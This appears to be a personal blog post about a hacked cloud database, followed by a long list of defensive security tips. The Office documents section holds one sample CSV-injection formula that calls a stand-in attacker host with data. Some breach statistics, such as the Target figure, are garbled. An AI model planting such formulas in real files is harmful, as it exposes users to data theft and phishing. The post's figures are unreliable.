---
layout: post
title: I got Hacked and It changed my life
comments: true
pageviews__total: 104
pageviews__recent: 104
pageviews__avg_time: 171
tutorial__order: 0
toc: true
photos:
  - /images/i-got-hacked-change-life-security-tips-small.jpg
  - /images/i-got-hacked-change-life-security-tips-large.jpg
photos__background_color: '#A6282E'
tags:
  - security
categories:
  - Miscellaneous
date: 2019-01-24 16:08:53
updated: 2019-01-24 16:08:53
---

I got hacked, and it changed my life's **perspective** **on security**. Here's a compilation of something that happened to me and some security tips to prevent it.

# Hack incident

I've been very chill about security most of my life. I'm 32, and I never got my social media hacked or emails. However, something that changed when I set up a personal server on the cloud and I got an intruder!

This server was collecting data from financial markets (just for fun and to play with some backtracking strategies). One day, I check the data as usual, and It was empty! I was in shock! What happened!? 👀

I reviewed the authentication logs and found out thousands of attempts to log in to my server! 🤯 I saw attempts from everywhere: France, Rusia, Canada, Germany, China, and other countries! Fortunately, none of this got in. However, I still got hacked, how? 🤔

It turns out that when I set up the database, I didn't bother to change the default configuration. It wouldn't do that for work but since it was a personal project and the data was public anyway, so I didn't care too much. I also thought "Meh, nobody is going to find it. I don't have this IP published anywhere". However, I was wrong. People/bots did find it and tons of them!

So I learned the following. There are people/organizations which scan every possible IP address. It doesn't matter if it is listed anywhere or not. Hackers/bots will scan any known port on every IP address and hope people leave defaults open.

Hackers will try to log in into your server and try very common usernames (`pi`, `linode`, `root`, `admin`, etc.) and default passwords. They also attempt to connect to any possible database on their default ports. This not being paranoid, I was able to see all the attempts from the logs.

I'm glad they drop my database, so I noticed what happened. Hackers could keep login to my server for years, and I probably wouldn't notice for a long time. That might be happening right now. Many companies have their servers compromised, and they don't even know it. When they realized it, it's already late, and then you see the news about it.

Some examples of data breaches:
- In 2013, **Yahoo** 3 billion users and **Target** with 110 credit cards.
- In 2014, **Marriott** with 500 million guests and **eBay** with 145 million users.
- In 2017, **Equifax** with 143 million social security numbers, addresses, and birth dates.
- Even banks get hacked like the JP Morgan **Chase** on 2014 with 76 million households and 7 million businesses.
- Not even security companies are exempt like **RSA Security** in 2011 with 40 million employee records stolen.

As you can see, the cybercriminals are real, and everything that you have connected to the Internet is their target. No company or person can 100% prevent being hacked. However, you can make it way more difficult and reduce the chances to 1 in 1000 years, which is pretty good.

For instance, just your password length and special character alone can tell how long would take to break it:
- If your password is `Password` takes around 0.29 seconds to break.
- If your password is `P@ssw0rd` takes around 14 years.
- If your password has 12 characters `abcdefghijkl` it takes 200 years to generate it.
- This password `P@ssw0rd123456!!` would take more than hundreds of thousand years to hack.


# Security Tips

Here are my 67 security tips on bullet points.

## Generic tips
  - Use different passwords for everything. If you use the same password for everything some website gets compromised (e.g., Amazon), then everything that has the same user and password will be at risk. I know it's a hassle to remember all, but you don't have to. Use a password manager like Bitwarden, 1Password, LastPass, Dashlane or even Google Chrome built-in password manager.
  - Use long passwords with special characters. If you are using a password manager, you can ask to auto-generate a secure password.
  - Use ** 2-factor authentication** whenever is available.
  - Enable all security features on the services that you use.
  - Everything that runs arbitrary code on your computer should not be trusted.
  - Don't trust defaults blindly verify if there's a more secure option.
  - Keep all your devices, operating systems and dependencies up-to-date. Most well-known vulnerabilities are fixed shortly after they are reported.

## Email security tips
  - Have ** 2-factor authentication** on your emails. If someone gets access to your primary email, then they can use `forgot password` on many sites (Evernote, Bank Accounts) and change the password. I heard of somebody that got their email compromised, in turn, the hacker got access to their Evernote and found some passwords to their cryptocurrency exchanges and got robbed big time. Don't be that guy. Enable 2FA.
  - Be aware of phishing emails. No, Bill Gates won't share his fortune and donate you a million, nor you won any lottery. Don't trust any email saying that you won money or any price. Also, be aware of fake company emails asking for you to log in somewhere. The site might look very similar, but it's a trap! They want to capture your password. Check the domain carefully or even better yet don't click on any link from the email and type your company web address directly as you usually do.
  - Be aware of malicious attachments. Specially executables (*.exe, *.bat, *.sh, *.zip). See also Microsoft documents part. Everything that can run arbitrary code on your computer should not be trusted.

## Social Media
  - Enable all the security options they have like 2 Factor authentication, SMS confirmation.

## Microsoft Documents
  - If you use your documents locally or by trusted peers, you shouldn't have many problems. However, for auto-generated documents like (*.csv) that you download from emails or compromised websites they can change data or insert malicious links (`=HYPERLINK("[http://attacker.com?some='data](http://attacker.com/?some=%27data%27)')`) and take you to their websites.
  - Be aware of macros. They are code that automatically runs when you open the program. In modern versions, Office alerts you when a doc has a macro, and now they are disabled by default.

## Wifi security tips
  - Use a password for your wifi. If you leave it open anybody connects to it can have access to your computers, cell phones, tablets, and smart fridge or cameras.
  - Use strong encryption for Wifi. Don't use WEP encryption. Use  WPA or the newer WPA2. WEP can be cracked relatively quickly using some programs.
  - Use a strong password. It makes it harder to break.
  - Provide a separate network for guests, so your connected devices are not exposed nor your router.
  - If you use public wifi, consider using a VPN. Hotspot operators and ISPs can snoop into your traffic, but if you use a VPN, they won't be able to.
  - If you are very paranoid or are working with something top secret. Here are some advanced options:
      - Have a hidden Wi-fi (SSID) and don't broadcast it. You will need the name to connect to it.
      - Restrict access by MAC address list. This list will allow only the devices in there to connect to the network.
      - Shutdown your network when is not in used. It's a little extreme, but that's the ultimate security measure or use wired connections.

## Developers security tips
  - Keep all your operating systems and dependencies up-to-date. As vulnerabilities are reported, they are fixed in newer versions.
  - Use latest encryption protocols TLS (rather than older SSL versions)
      - Use SFTP instead of FTP
      - Use SSH instead of telnet
      - Use HTTPS instead of HTTP. You can encrypt for free with [Let's Encrypt](https://letsencrypt.org/).
  - Disable direct root login in SSH. You can escalate if needed using `sudo`.
  - Disable SSH connection with passwords. Use ssh private key to log in instead.
  - Use firewalls to block any port that you are not using. Firewalls minimize the surface of attack. For Linux, you can use `UFW`; other option is `iptables`.
  - Use VPN and private networks. If you don't need to expose a database to the internet, even better. Make it only accessible for your private network or VPN.
  - Don't trust default configuration of programs facing the internet. Change default ports on databases, ssh.
      - Instead of logging `ssh` on port `22`. Use port `2146` for instance. I did this and noticed how the attempts of login went from hundreds to zero.
      - Instead of running MongoDB on port `27017`, use `56073`
  - Change default user/passwords. Remove default users (e.g., RaspberryPi comes with the `pi` user that allow people to login into it, change it!)
  - Enable authorization on your databases (use passwords). Don't leave them wide open to the world (and hackers).
  - Remove default accounts in your databases. E.g., MySQL
  - Keep backups (nightly?)
  - Automate monitoring and alert reports. Nobody has time to be glued to logs every time. However, you should set alerts when certain events happen.
      - Alerts for failed attempts of login
          - `zcat /var/log/auth.log.*.gz | grep 'sshd' | grep 'exceeded\|Invalid' | cut -d: -f4- | sort | uniq -c | sort -rn`
      - Monitor your database logs for anomalies, such as dropping database commands.
  - Be aware of package managers. To name a few Node's NPM, Ruby Gems and Mac's [brew.sh](http://brew.sh). If someone gets access to the administrator password of popular packages you might be at risk.
      - NPM has scripts that can run arbitrary code when something is installed: [postinstall](https://docs.npmjs.com/misc/scripts#examples). Similarly,  Ruby Gems ha a `post_install` hook. This script has access to your whole file system, ssh keys and nothing prevent them from sending them to a remote server.
      - Brew adds binaries on your `/usr/local` and modifies the `PATH`, so this location has the preference. That change could make malicious programs run before the original program.
  - Finally, never trust anything that comes from the user/internet.  If you are running a web form, sanitize the inputs (strip out malicious scripts).

